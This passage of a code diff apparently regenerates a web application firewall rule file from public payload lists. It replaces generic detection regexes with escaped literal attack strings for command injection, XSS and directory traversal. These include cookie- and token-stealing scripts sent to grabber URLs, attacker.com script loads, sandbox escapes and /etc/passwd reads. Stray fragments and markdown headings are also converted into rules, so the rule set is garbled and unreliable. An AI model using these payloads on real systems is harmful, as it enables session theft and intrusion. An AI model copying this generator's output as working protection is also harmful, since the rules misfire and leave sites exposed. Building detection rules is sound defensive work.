@@ -1,256 +1,594 @@
+"""
+Enhanced WAF Rules - Auto-generated
+
+Sources:
+- OWASP Core Rule Set (https://github.com/coreruleset/coreruleset)
+- SecLists (https://github.com/danielmiessler/SecLists)
+- PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
+
+DO NOT EDIT MANUALLY - Regenerate using enhanced_rules_generator.py
+"""
+
 RULES = {
-    "SQL Injection": [
-        # Union-based injection
-        r"(?i)(\bunion\b.{1,100}?\bselect\b)",
-        r"(?i)(\bselect\b.{1,100}?\bfrom\b.{1,100}?\bwhere\b)",
-        
-        # Boolean-based blind
-        r"(?i)((\bor|\band)\b\s*['\"]?\w*['\"]?\s*=\s*['\"]?\w*['\"]?)",
-        r"(?i)(['\"]?\s*(or|and)\s*['\"]?[0-9]+['\"]?\s*[=<>]+\s*['\"]?[0-9]+)",
-        
-        # Time-based blind
-        r"(?i)(benchmark\s*\(\s*\d+)",
-        r"(?i)(sleep\s*\(\s*\d+)",
-        r"(?i)(waitfor\s+delay\s+['\"])",
-        r"(?i)(pg_sleep\s*\()",
-        
-        # Stacked queries
-        r"(?i)(;.{0,10}?(drop|alter|create|truncate|insert|update|delete|exec))",
-        
-        # Comment injection
-        r"(?i)(['\"]?\s*(--|#|\/\*))",
-        r"(?i)(\/\*!?\d{0,5}\s*(?:union|select|insert|update|delete|drop|create|alter))",
-        
-        # Information gathering
-        r"(?i)(information_schema|sysobjects|syscolumns|mysql\.user)",
-        r"(?i)(\btable_schema\b|\btable_name\b)",
-        
-        # Functions and procedures
-        r"(?i)(\bexec(\s|\+)+(s|x)p\w+)",
-        r"(?i)(xp_cmdshell|sp_executesql|sp_oacreate)",
-        
-        # Encoding bypasses
-        r"(?i)(0x[0-9a-f]{2,})",  # Hex encoding
-        r"(?i)(char\s*\(\s*\d+\s*\))",  # CHAR function
-        r"(?i)(ascii\s*\(\s*substr)",  # ASCII substring
-        r"(?i)(unhex\s*\(|hex\s*\()",
-        
-        # Error-based
-        r"(?i)(extractvalue\s*\(|updatexml\s*\()",
-        r"(?i)(exp\s*\(~\s*\(|floor\s*\(rand\s*\()",
-        
-        # Out-of-band
-        r"(?i)(load_file\s*\(|into\s+outfile)",
-    ],
-    
-    "Cross-Site Scripting": [
-        # Script tags
-        r"(?i)(<script[^>]*>[\s\S]*?<\/script>)",
-        r"(?i)(<script[^>]*>)",
-        
-        # Event handlers
-        r"(?i)(on\w+\s*=\s*['\"]?[^'\">]*['\"]?)",
-        r"(?i)(<[^>]+\s+on(load|error|click|mouse\w+|focus|blur|change|submit)\s*=)",
-        
-        # JavaScript protocol
-        r"(?i)(javascript:)",
-        r"(?i)(vbscript:)",
-        
-        # Data URIs
-        r"(?i)(data:text\/html[^,]*,[\s\S]*<script)",
-        r"(?i)(data:image\/svg\+xml[^,]*,[\s\S]*<script)",
-        
-        # DOM manipulation
-        r"(?i)(document\.(cookie|write|writeln|location|domain))",
-        r"(?i)(window\.(location|eval|execScript|setTimeout|setInterval))",
-        r"(?i)(\.innerHTML\s*=)",
-        
-        # HTML injection
-        r"(?i)(<iframe[^>]*>)",
-        r"(?i)(<embed[^>]*>)",
-        r"(?i)(<object[^>]*>)",
-        r"(?i)(<applet[^>]*>)",
-        r"(?i)(<meta[^>]*>)",
-        
-        # Image tags with XSS
-        r"(?i)(<img[^>]*src[^>]*onerror)",
-        r"(?i)(<img[^>]*src\s*=\s*javascript:)",
-        
-        # SVG-based XSS
-        r"(?i)(<svg[^>]*>[\s\S]*?<script)",
-        r"(?i)(<svg[^>]*onload\s*=)",
-        
-        # CSS expression
-        r"(?i)(expression\s*\([^)]*\))",
-        r"(?i)(behavior\s*:\s*url)",
-        r"(?i)(@import\s+['\"]?javascript:)",
-        
-        # XML/RSS XSS
-        r"(?i)(<\?xml[^>]*>[\s\S]*?<script)",
-        
-        # Form injection
-        r"(?i)(<form[^>]*action\s*=)",
-        r"(?i)(<input[^>]*type\s*=\s*['\"]?hidden)",
-        
-        # Uncommon tags
-        r"(?i)(<marquee[^>]*>)",
-        r"(?i)(<bgsound[^>]*>)",
-        r"(?i)(<link[^>]*>)",
-    ],
-    
     "Command Injection": [
-        # Shell command chaining
-        r"(;|\||`|\$\(|\$\{).{0,20}?(cat|ls|wget|curl|nc|bash|sh|cmd|powershell|whoami|id|pwd)",
-        
-        # Common Unix commands
-        r"(?i)(\b(cat|tac|nl|od|base64|xxd)\b.{0,50}?(\/etc\/passwd|\/etc\/shadow))",
-        r"(?i)(\b(ls|dir|find)\b\s+(-la|-R))",
-        r"(?i)(\buname\b\s*-a)",
-        
-        # Network commands
-        r"(?i)(\b(wget|curl|fetch|lynx)\b.{1,100}?(http|ftp))",
-        r"(?i)(\bnc\b\s+(-l|-e|\.exec))",
-        r"(?i)(\btelnet\b.{1,50}?\d+)",
-        
-        # File operations
-        r"(?i)(\b(rm|del|rmdir)\b\s+(-rf|-r|-f))",
-        r"(?i)(\b(chmod|chown|chgrp)\b)",
-        r"(?i)(\b(cp|mv|dd)\b.{1,100}?\/dev)",
-        
-        # Process commands
-        r"(?i)(\b(ps|top|kill|killall|pkill)\b)",
-        r"(?i)(\b(nohup|disown)\b)",
-        
-        # Shell invocation
-        r"(?i)(\/bin\/(ba)?sh)",
-        r"(?i)(cmd\.exe|cmd\s+\/c)",
-        r"(?i)(powershell\.exe|pwsh)",
-        r"(?i)(\bperl\b\s+-e)",
-        r"(?i)(\bpython\b\s+(-c|<))",
-        r"(?i)(\bruby\b\s+-e)",
-        
-        # Privilege escalation
-        r"(?i)(\bsudo\b|\bsu\b\s+(-|root))",
-        r"(?i)(\bchroot\b)",
-        
-        # Environment manipulation
-        r"(?i)(PATH\s*=|LD_PRELOAD\s*=)",
-        r"(?i)(\bexport\b.{1,50}?(PATH|LD_PRELOAD))",
+        r"(?i)command1;\\ command2\\ \\ \\ \\#\\ Execute\\ command1\\ and\\ then\\ command2",
+        r"(?i)%7Cecho%20IRODNG\\$\\(\\(26%2B68\\)\\)\\$\\(echo%20IRODNG\\)IRODNG",
+        r"(?i)\\|\\|echo%20ANSBHE\\$\\(\\(26%2B89\\)\\)\\$\\(echo%20ANSBHE\\)ANSBHE",
+        r"(?i)\\.\\.\\.",
+        r"(?i)\\?>",
+        r"(?i)echo%20IFNPXI\\$\\(\\(40%2B99\\)\\)\\$\\(echo%20IFNPXI\\)IFNPXI'",
+        r"(?i)\\$url\\ =\\ \"https://example\\.tld/\"\\ \\.\\ \\$_GET\\['path'\\]\\ \\.\\ \"\\.txt\";",
+        r"(?i)%7Cecho%20VDZSYZ\\$\\(\\(58%2B1\\)\\)\\$\\(echo%20VDZSYZ\\)VDZSYZ'",
+        r"(?i)\\&\\&echo%20CMMOTV\\$\\(\\(30%2B10\\)\\)\\$\\(echo%20CMMOTV\\)CMMOTV'",
+        r"(?i)%20echo%20TDJHRY\\$\\(\\(30%2B41\\)\\)\\$\\(echo%20TDJHRY\\)TDJHRY",
+        r"(?i)%26%26echo%20XKFEGJ\\$\\(\\(1%2B49\\)\\)\\$\\(echo%20XKFEGJ\\)XKFEGJ\"",
+        r"(?i)\\|echo%20TJEGSE\\$\\(\\(27%2B57\\)\\)\\$\\(echo%20TJEGSE\\)TJEGSE",
+        r"(?i)%3Becho%20SRPJET\\$\\(\\(29%2B34\\)\\)\\$\\(echo%20SRPJET\\)SRPJET",
+        r"(?i)%7Cecho%20YPOSVR\\$\\(\\(24%2B62\\)\\)\\$\\(echo%20YPOSVR\\)YPOSVR\"",
+        r"(?i)%26echo%20VOANQN\\$\\(\\(77%2B86\\)\\)\\$\\(echo%20VOANQN\\)VOANQN'",
+        r"(?i)%7C%7Cecho%20HYHREQ\\$\\(\\(78%2B11\\)\\)\\$\\(echo%20HYHREQ\\)HYHREQ'",
+        r"(?i)bin:x:2:2:bin:/bin:/bin/sh",
+        r"(?i)chrome\\ '\\-\\-gpu\\-launcher=\"id>/tmp/foo\"'",
+        r"(?i)%0aecho%20VKWHEH\\$\\(\\(83%2B36\\)\\)\\$\\(echo%20VKWHEH\\)VKWHEH'",
+        r"(?i)root:x:0:0:root:/root:/bin/bash",
+        r"(?i)\\&\\&echo%20QTDSQL\\$\\(\\(20%2B35\\)\\)\\$\\(echo%20QTDSQL\\)QTDSQL\"",
+        r"(?i)sys:x:3:3:sys:/dev:/bin/sh",
+        r"(?i)echo%20GHWFXG\\$\\(\\(12%2B72\\)\\)\\$\\(echo%20GHWFXG\\)GHWFXG\"",
+        r"(?i)%20echo%20BAJXZZ\\$\\(\\(73%2B7\\)\\)\\$\\(echo%20BAJXZZ\\)BAJXZZ\"",
+        r"(?i)\\|\\|echo%20XIYAUA\\$\\(\\(17%2B90\\)\\)\\$\\(echo%20XIYAUA\\)XIYAUA'",
+        r"(?i)\\|\\|echo%20RWZHCR\\$\\(\\(74%2B28\\)\\)\\$\\(echo%20RWZHCR\\)RWZHCR\"",
+        r"(?i)echo%20CWRXRJ\\$\\(\\(77%2B13\\)\\)\\$\\(echo%20CWRXRJ\\)CWRXRJ",
+        r"(?i)%3Becho%20RHJGKQ\\$\\(\\(38%2B71\\)\\)\\$\\(echo%20RHJGKQ\\)RHJGKQ",
+        r"(?i)cat\\ /etc/passwd",
+        r"(?i)command1\\ \\|\\|\\ command2\\ \\#\\ Execute\\ command2\\ only\\ if\\ command1\\ fails",
+        r"(?i)\\&echo%20DACXMN\\$\\(\\(57%2B35\\)\\)\\$\\(echo%20DACXMN\\)DACXMN'",
+        r"(?i)echo%20AGIYMZ\\$\\(\\(69%2B52\\)\\)\\$\\(echo%20AGIYMZ\\)AGIYMZ",
+        r"(?i)%0aecho%20MBVQWK\\$\\(\\(48%2B90\\)\\)\\$\\(echo%20MBVQWK\\)MBVQWK",
+        r"(?i)\\|echo%20PRCGGO\\$\\(\\(57%2B79\\)\\)\\$\\(echo%20PRCGGO\\)PRCGGO\"",
+        r"(?i)\\&echo%20NWMZCF\\$\\(\\(57%2B72\\)\\)\\$\\(echo%20NWMZCF\\)NWMZCF",
+        r"(?i)\\|echo%20DDLJJW\\$\\(\\(33%2B23\\)\\)\\$\\(echo%20DDLJJW\\)DDLJJW'",
+        r"(?i)%20echo%20IBQHOS\\$\\(\\(92%2B76\\)\\)\\$\\(echo%20IBQHOS\\)IBQHOS",
+        r"(?i);echo%20CSPAAF\\$\\(\\(48%2B26\\)\\)\\$\\(echo%20CSPAAF\\)CSPAAF",
+        r"(?i)\\&echo%20DRUCFI\\$\\(\\(69%2B56\\)\\)\\$\\(echo%20DRUCFI\\)DRUCFI",
+        r"(?i)\\&\\&echo%20FOJNEL\\$\\(\\(64%2B8\\)\\)\\$\\(echo%20FOJNEL\\)FOJNEL",
+        r"(?i)system\\(\"wget\\.exe\\ \\-q\\ \"\\ \\.\\ escapeshellarg\\(\\$url\\)\\);",
+        r"(?i)%26echo%20YYWLTQ\\$\\(\\(61%2B71\\)\\)\\$\\(echo%20YYWLTQ\\)YYWLTQ\"",
+        r"(?i)command1\\ \\&\\&\\ command2\\ \\#\\ Execute\\ command2\\ only\\ if\\ command1\\ succeeds",
+        r"(?i)%20echo%20HBFEEM\\$\\(\\(46%2B2\\)\\)\\$\\(echo%20HBFEEM\\)HBFEEM'",
+        r"(?i);echo%20YRBNTY\\$\\(\\(83%2B14\\)\\)\\$\\(echo%20YRBNTY\\)YRBNTY\"",
+        r"(?i)%0aecho%20VVIEOJ\\$\\(\\(30%2B78\\)\\)\\$\\(echo%20VVIEOJ\\)VVIEOJ",
+        r"(?i)\\|echo%20TWNZDU\\$\\(\\(10%2B40\\)\\)\\$\\(echo%20TWNZDU\\)TWNZDU",
+        r"(?i)system\\(\"ping\\ \\-c\\ 4\\ \"\\ \\.\\ \\$ip\\);",
+        r"(?i)%7C%7Cecho%20CFGBVN\\$\\(\\(38%2B88\\)\\)\\$\\(echo%20CFGBVN\\)CFGBVN\"",
+        r"(?i)ssh\\ '\\-oProxyCommand=\"touch\\ /tmp/foo\"'\\ foo@foo",
+        r"(?i)%7C%7Cecho%20KRCSNE\\$\\(\\(57%2B75\\)\\)\\$\\(echo%20KRCSNE\\)KRCSNE",
+        r"(?i);echo%20MPCSBG\\$\\(\\(54%2B42\\)\\)\\$\\(echo%20MPCSBG\\)MPCSBG",
+        r"(?i)%26%26echo%20QOZRFB\\$\\(\\(19%2B4\\)\\)\\$\\(echo%20QOZRFB\\)QOZRFB",
+        r"(?i)<\\?php",
+        r"(?i)%3Becho%20RDKWWC\\$\\(\\(22%2B44\\)\\)\\$\\(echo%20RDKWWC\\)RDKWWC'",
+        r"(?i)\\&\\&echo%20PVJXOS\\$\\(\\(12%2B1\\)\\)\\$\\(echo%20PVJXOS\\)PVJXOS",
+        r"(?i)command1\\ \\&\\ command2\\ \\ \\#\\ Execute\\ command1\\ in\\ the\\ background",
+        r"(?i)%26echo%20NQPWBV\\$\\(\\(16%2B77\\)\\)\\$\\(echo%20NQPWBV\\)NQPWBV",
+        r"(?i)%3Becho%20QXBWJP\\$\\(\\(56%2B78\\)\\)\\$\\(echo%20QXBWJP\\)QXBWJP\"",
+        r"(?i)daemon:x:1:1:daemon:/usr/sbin:/bin/sh",
+        r"(?i);echo%20KHMFRS\\$\\(\\(69%2B67\\)\\)\\$\\(echo%20KHMFRS\\)KHMFRS'",
+        r"(?i)%26echo%20MUQJWT\\$\\(\\(7%2B78\\)\\)\\$\\(echo%20MUQJWT\\)MUQJWT",
+        r"(?i)command1\\ \\|\\ command2\\ \\ \\#\\ Pipe\\ the\\ output\\ of\\ command1\\ into\\ command2",
+        r"(?i)psql\\ \\-o'\\|id>/tmp/foo'",
+        r"(?i)%26%26echo%20KHAVOV\\$\\(\\(90%2B77\\)\\)\\$\\(echo%20KHAVOV\\)KHAVOV",
+        r"(?i)\\|\\|echo%20TPIMPW\\$\\(\\(11%2B13\\)\\)\\$\\(echo%20TPIMPW\\)TPIMPW",
+        r"(?i)\\$ip\\ =\\ \\$_GET\\['ip'\\];",
+        r"(?i)%0aecho%20NCRQQT\\$\\(\\(66%2B95\\)\\)\\$\\(echo%20NCRQQT\\)NCRQQT\"",
+        r"(?i)\\&echo%20WQLTXV\\$\\(\\(0%2B25\\)\\)\\$\\(echo%20WQLTXV\\)WQLTXV\"",
+        r"(?i)%26%26echo%20EXUMZL\\$\\(\\(4%2B99\\)\\)\\$\\(echo%20EXUMZL\\)EXUMZL'",
     ],
-    
+
+    "Cross-Site Scripting": [
+        r"(?i)script=document\\.createElement\\('script'\\);",
+        r"(?i)Set\\.constructor`al\\\\x65rt\\\\x2814\\\\x29",
+        r"(?i)\\$fp\\ =\\ fopen\\('cookies\\.txt',\\ 'a\\+'\\);",
+        r"(?i)//\\ Author:\\ europa",
+        r"(?i)\\-\\->'\"/></sCript><svG\\ x=\">\"\\ onload=\\(co\\\\u006efirm\\)``>",
+        r"(?i)c\\.\\$apply=\\$apply;c\\.\\$eval=b;op=\\$root\\.\\$\\$phase;",
+        r"(?i)GET\\ /\\?xss=<script>alert\\(1\\)</script>\\&a\\&a\\&a\\&a\\&a\\&a\\&a\\&a\\.\\.\\.\\[REPEATED\\ \\&a\\ 1000\\ times\\]\\&a\\&a\\&a\\&a",
+        r"(?i)<svg\\ onload=prompt%26%230000000040document\\.domain\\)>",
+        r"(?i)javascript://</title>\"/</script></style></textarea/\\-\\->\\*/<alert\\(\\)/\\*'\\ onclick=alert\\(\\)//>/",
+        r"(?i)</script><svg><script>alert\\(1\\)\\-%26apos%3B",
+        r"(?i)C=c\\.\\$apply\\(c\\);\\$root\\.\\$\\$phase=op;\\$root\\.\\$digest=od;",
+        r"(?i)<base\\ href=http://www\\.attacker\\.com>",
+        r"(?i)<svg/onrandom=random\\ onload=confirm\\(1\\)>",
+        r"(?i)/</title/'/</style/</script/</textarea/\\-\\-><p\"\\ onclick=alert\\(\\)//>\\*/alert\\(\\)/\\*",
+        r"(?i)\\{\\{constructor\\.constructor\\('alert\\(1\\)'\\)\\(\\)\\}\\}",
+        r"(?i)eval\\('ale'\\+'rt\\(0\\)'\\);",
+        r"(?i)\\\\u003e\\\\u003c\\\\u0068\\\\u0031\\ onclick=alert\\('1'\\)\\\\u003e",
+        r"(?i)\\#\\#\\ Bypass\\ Quotes\\ in\\ Script\\ Tag",
+        r"(?i)javascript://\\-\\-></script></title></style>\"/</textarea>\\*/<alert\\(\\)/\\*'\\ onclick=alert\\(\\)//>a",
+        r"(?i)fwrite\\(\\$fp,\\ 'Cookie:'\\ \\.\\$cookie\\.\"\\\\r\\\\n\"\\);",
+        r"(?i)mode:\\ 'no\\-cors',",
+        r"(?i)<script>document\\.location='http://localhost/XSS/grabber\\.php\\?c='\\+document\\.cookie</script>",
+        r"(?i)<script>new\\ Image\\(\\)\\.src=\"http://localhost/cookie\\.php\\?c=\"\\+document\\.cookie;</script>",
+        r"(?i)anythinglr00%3c%2fscript%3e%3cscript%3ealert\\(document\\.domain\\)%3c%2fscript%3euxldz",
+        r"(?i)fetch\\('https://<SESSION>\\.burpcollaborator\\.net',\\ \\{",
+        r"(?i)fclose\\(\\$fp\\);",
+        r"(?i)\\-\\-></script></title></style>\"/</textarea><a'\\ onclick=alert\\(\\)//>\\*/alert\\(\\)/\\*",
+        r"(?i)<\\?php",
+        r"(?i)\\{\\{\\[\\]\\.pop\\.constructor\\&\\#40'alert\\\\u00281\\\\u0029'\\&\\#41\\&\\#40\\&\\#41\\}\\}",
+        r"(?i)\"/><script>alert\\(1\\);</script>",
+        r"(?i)<svg/onload=\\&\\#97\\&\\#108\\&\\#101\\&\\#114\\&\\#00116\\&\\#40\\&\\#41\\&\\#x2f\\&\\#x2f",
+        r"(?i)\"\\);",
+        r"(?i)<script\\ x>",
+        r"(?i)method:\\ 'POST',",
+        r"(?i)astNode\\.argument=\\{type:'Identifier',name:'foo'\\};",
+        r"(?i)\"\\ onclick=alert\\(1\\)//<button\\ ‘\\ onclick=alert\\(1\\)//>\\ \\*/\\ alert\\(1\\)//",
+        r"(?i)<svg%0Ao%00nload=%09\\(\\(pro\\\\u006dpt\\)\\)\\(\\)//",
+        r"(?i)You\\ can\\ bypass\\ a\\ single\\ quote\\ with\\ \\&\\#39;\\ in\\ an\\ on\\ mousedown\\ event\\ handler",
+        r"(?i)Works\\ on\\ IE/Firefox/Chrome/Safari",
+        r"(?i)<script\\ x>alert\\('XSS'\\)<script\\ y>",
+        r"(?i)xss'\"><iframe\\ srcdoc='%26lt;script>;prompt`\\$\\{document\\.domain\\}`%26lt;/script>'>",
+        r"(?i)javascript://</title></textarea></style></script\\ \\-\\-><li\\ '//\"\\ '\\*/alert\\(\\)/\\*',\\ onclick=alert\\(\\)//",
+        r"(?i)m2=B\\(C,null,m1\\);\\[\\]\\.push\\.apply=m2;a=''\\.sub;",
+        r"(?i)<svg\\ onload\\\\r\\\\n=\\$\\.globalEval\\(\"al\"\\+\"ert\\(\\)\"\\);>",
+        r"(?i)m1=B\\(\\$\\$asyncQueue\\.pop\\(\\)\\.expression,null,\\$root\\);",
+        r"(?i)<script>",
+        r"(?i)1'\"><img/src/onerror=\\.1\\|alert``>",
+        r"(?i)Set\\.constructor\\('ale'\\+'rt\\(13\\)'\\)\\(\\);",
+        r"(?i)javascript:\"/\\*'/\\*`/\\*\\\\\"\\ /\\*</title></style></textarea></noscript></noembed></template></script/\\-\\->\\&lt;svg/onload=/\\*<html/\\*/onmouseover=alert\\(\\)//>",
+        r"(?i)jaVasCript:/\\*\\-/\\*`/\\*\\\\`/\\*'/\\*\"/\\*\\*/\\(/\\*\\ \\*/oNcliCk=alert\\(\\)\\ \\)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/\\-\\-!>\\\\x3csVg/<sVg/oNloAd=alert\\(\\)//>\\\\x3e",
+        r"(?i)\\#\\#\\ Bypass\\ with\\ Incomplete\\ HTML\\ Tag",
+        r"(?i)javascript://</title></style></textarea>\\-\\-></script><a\"//'\\ onclick=alert\\(\\)//>\\*/alert\\(\\)/\\*",
+        r"(?i)//\\ Author:\\ crlf",
+        r"(?i)<object\\ data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
+        r"(?i)\\{\\{",
+        r"(?i)script\\.src='//remoteattacker\\.lab/csp\\.js';",
+        r"(?i)anythinglr00</script><script>alert\\(document\\.domain\\)</script>uxldz",
+        r"(?i)setTimeout\\('ale'\\+'rt\\(2\\)'\\);",
+        r"(?i)\\#\\#\\ Bypass\\ Quotes\\ for\\ String",
+        r"(?i)window\\.frames\\[0\\]\\.document\\.head\\.appendChild\\(script\\);",
+        r"(?i)<script>document\\.location='http://localhost/XSS/grabber\\.php\\?c='\\+localStorage\\.getItem\\('access_token'\\)</script>",
+        r"(?i)\\$eval\\('a\\(b\\.c\\)'\\);\\[\\]\\.push\\.apply=a;",
+        r"(?i)/</title/'/</style/</script/\\-\\-><p\"\\ onclick=alert\\(\\)//>\\*/alert\\(\\)/\\*",
+        r"(?i)<svg/OnLoad=\"`\\$\\{prompt``\\}`\">",
+        r"(?i)http://www\\.attacker\\.com/PATH\\.js",
+        r"(?i)<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a\\(\\)\\ x>",
+        r"(?i)<a\\ href=\"j\\&Tab;a\\&Tab;v\\&Tab;asc\\&NewLine;ri\\&Tab;pt\\&colon;\\&lpar;a\\&Tab;l\\&Tab;e\\&Tab;r\\&Tab;t\\&Tab;\\(document\\.domain\\)\\&rpar;\">X</a>",
+        r"(?i)\\{\\{\\$eval\\.constructor\\('alert\\(1\\)'\\)\\(\\)\\}\\}",
+        r"(?i)\\?\"></script><base%20c%3D=href%3Dhttps:\\\\mysite>",
+        r"(?i)javascript:alert\\(\\)//\\-\\-></script></textarea></style></title><a\"//'\\ onclick=alert\\(\\)//>\\*/alert\\(\\)/\\*",
+        r"(?i)\\$root\\.\\$\\$phase=null;od=\\$root\\.\\$digest;\\$root\\.\\$digest=\\(\\{\\}\\)\\.toString;",
+        r"(?i)astNode=pop\\(\\);astNode\\.type='UnaryExpression';",
+        r"(?i)astNode\\.operator='\\(window\\.X\\?void0:\\(window\\.X=true,alert\\(1\\)\\)\\)\\+';",
+        r"(?i)\\#\\#\\ Bypass\\ Dot\\ Filter",
+        r"(?i)\\}\\}",
+        r"(?i)\\{\\{x\\ =\\ \\{'y':''\\.constructor\\.prototype\\};\\ x\\['y'\\]\\.charAt=\\[\\]\\.join;\\$eval\\('x=alert\\(1\\)'\\);\\}\\}",
+        r"(?i)\\$cookie\\ =\\ \\$_GET\\['c'\\];",
+        r"(?i)new\\ Function`al\\\\ert\\\\`6\\\\``;",
+        r"(?i)</script>",
+        r"(?i)\\?>",
+        r"(?i)<video\\ onnull=null\\ onmouseover=confirm\\(1\\)>",
+        r"(?i)<svg/onload=%26nbsp;alert`bohdan`\\+",
+        r"(?i)“\\ onclick=alert\\(1\\)//<button\\ ‘\\ onclick=alert\\(1\\)//>\\ \\*/\\ alert\\(1\\)//",
+        r"(?i)<script>new\\ Image\\(\\)\\.src=\"http://localhost/cookie\\.php\\?c=\"\\+localStorage\\.getItem\\('access_token'\\);</script>",
+        r"(?i)\\{\\{0\\[a='constructor'\\]\\[a\\]\\('alert\\(1\\)'\\)\\(\\)\\}\\}",
+        r"(?i)Base64\\ encoding\\ your\\ XSS\\ payload\\ with\\ Linux\\ command:\\ IE\\.\\ `echo\\ \\-n\\ \"alert\\(document\\.cookie\\)\"\\ \\|\\ base64`\\ ==\\ `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`",
+        r"(?i)Function\\(\"ale\"\\+\"rt\\(1\\)\"\\)\\(\\);",
+        r"(?i)c=''\\.sub\\.call;b=''\\.sub\\.bind;a=''\\.sub\\.apply;",
+        r"(?i)\\{\\{\\$on\\.constructor\\('alert\\(1\\)'\\)\\(\\)\\}\\}",
+        r"(?i)<a\\ href=javas\\&\\#99;ript:alert\\(1\\)>",
+        r"(?i)B=C\\(b,c,b\\);\\$evalAsync\\(\"",
+        r"(?i)javascript://\\-\\-></title></style></textarea></script><svg\\ \"//'\\ onclick=alert\\(\\)//",
+        r"(?i)<script\\ src=\"data:,alert\\(1\\)\">/</script>",
+        r"(?i)\\}\\);",
+        r"(?i)<object\\ data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
+        r"(?i)<sCrIpt>alert\\(1\\)</ScRipt>",
+        r"(?i)javascript://'//\"\\ \\-\\-></textarea></style></script></title><b\\ onclick=\\ alert\\(\\)//>\\*/alert\\(\\)/\\*",
+        r"(?i)setInterval\\('ale'\\+'rt\\(10\\)'\\);",
+        r"(?i)\\#\\#\\ Bypass\\ Quotes\\ in\\ Mousedown\\ Event",
+        r"(?i)body:\\ document\\.cookie",
+        r"(?i)<ScrIPt>alert\\(1\\)</ScRipT>",
+        r"(?i)javascript://'/</title></style></textarea></script>\\-\\-><p\"\\ onclick=alert\\(\\)//>\\*/alert\\(\\)/\\*",
+        r"(?i)Convert\\ IP\\ address\\ into\\ decimal\\ format:\\ IE\\.\\ `http://192\\.168\\.1\\.1`\\ ==\\ `http://3232235777`",
+        r"(?i)history\\.replaceState\\(null,\\ null,\\ '\\.\\./\\.\\./\\.\\./login'\\);",
+        r"(?i)<svg\\ onload=prompt%26%23x000000028;document\\.domain\\)>",
+        r"(?i)<script/src=//google\\.com/complete/search\\?client=chrome%26jsonp=alert\\(1\\);>\"",
+        r"(?i)javascript:\"/\\*'/\\*`/\\*\\-\\-></noscript></title></textarea></style></template></noembed></script><html\\ \\\\\"\\ onmouseover=/\\*\\&lt;svg/\\*/onload=alert\\(\\)//>",
+    ],
+
     "Directory Traversal": [
-        # Basic traversal
-        r"(\.\.\/|\.\.\\){2,}",
-        r"(\.\.;\/|\.\.;\\)",
-        
-        # Encoded traversal
-        r"(%2e%2e[\/\\]|%252e%252e[\/\\])",
-        r"(\.\.%2f|\.\.%5c)",
-        r"(%c0%ae%c0%ae\/|%c0%ae%c0%ae\\)",
-        
-        # Unicode encoding
-        r"(\.\.\u2216|\.\.\u2215)",
-        r"(\x2e\x2e[\/\\])",
-        
-        # Sensitive file access
-        r"(?i)(\/etc\/(passwd|shadow|hosts|group|issue))",
-        r"(?i)(\/proc\/self\/(environ|cmdline|fd))",
-        r"(?i)(c:\\windows\\(system32|win\.ini|boot\.ini))",
-        r"(?i)(\/var\/(log|mail|www))",
-        
-        # Application files
-        r"(?i)(web\.config|\.htaccess|\.htpasswd)",
-        r"(?i)(wp-config\.php|configuration\.php)",
-        r"(?i)(database\.yml|secrets\.yml)",
+        r"(?i)/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
+        r"(?i)\\.\\.%5c\\.\\.%5c\\.\\.%5c\\.\\.%5c\\.\\.%5c\\.\\.%5c\\.\\.%5c\\.\\.%5c\\.\\.%5c\\.\\.%5c/boot\\.ini",
+        r"(?i)/apache/logs/error_log",
+        r"(?i)/apache\\\\php\\\\php\\.ini",
+        r"(?i)/etc/httpd/logs/access_log",
+        r"(?i)/etc/logrotate\\.d/proftpd",
+        r"(?i)/etc/httpd/srm\\.conf",
+        r"(?i)http://example\\.com/index\\.php\\?page=\\.\\.\\.\\.//\\.\\.\\.\\.//etc/passwd",
+        r"(?i)%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%\\ \\ 25%5c\\.\\.%25%5c\\.\\.%00",
+        r"(?i)\\.\\./\\.\\./\\.\\./administrator/inbox",
+        r"(?i)\\#\\ vulnerable\\ file:\\ index\\.php",
+        r"(?i)/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot\\.ini",
+        r"(?i)/admin/install\\.php",
+        r"(?i)/etc/ftphosts",
+        r"(?i)\\./kadimus\\ \\-u\\ \"http://example\\.com/index\\.php\\?page=vuln\"\\ \\-S\\ \\-f\\ \"index\\.php%00\"\\ \\-O\\ index\\.php\\ \\-\\-parameter\\ page",
+        r"(?i)\\.\\./apache/logs/access\\.log",
+        r"(?i)/etc/apache2/httpd\\.conf",
+        r"(?i)/etc/at\\.deny",
+        r"(?i)http://example\\.com/index\\.php\\?page=expect://ls",
+        r"(?i)/etc/bashrc",
+        r"(?i)\\[\\+\\]\\ The\\ following\\ gadget\\ chain\\ will\\ generate\\ the\\ following\\ code\\ :\\ <\\?php\\ phpinfo\\(\\);\\?>\\ \\(base64\\ value:\\ PD9waHAgcGhwaW5mbygpOz8\\+\\)",
+        r"(?i)\\.\\./\\.\\./\\.\\./apache/logs/error\\.log",
+        r"(?i)/etc/apache2/\\.htpasswd",
+        r"(?i)%00/etc/passwd%00",
+        r"(?i)\\\\…\\.\\.\\\\\\\\\\\\…\\.\\.\\\\\\\\\\\\…\\.\\.\\\\\\\\\\\\",
+        r"(?i)/\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./%2A",
+        r"(?i)/etc/chttp\\.conf",
+        r"(?i)%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%00",
+        r"(?i)http://example\\.com/index\\.php\\?page=\\.\\./\\.\\./\\.\\./etc/passwd%00",
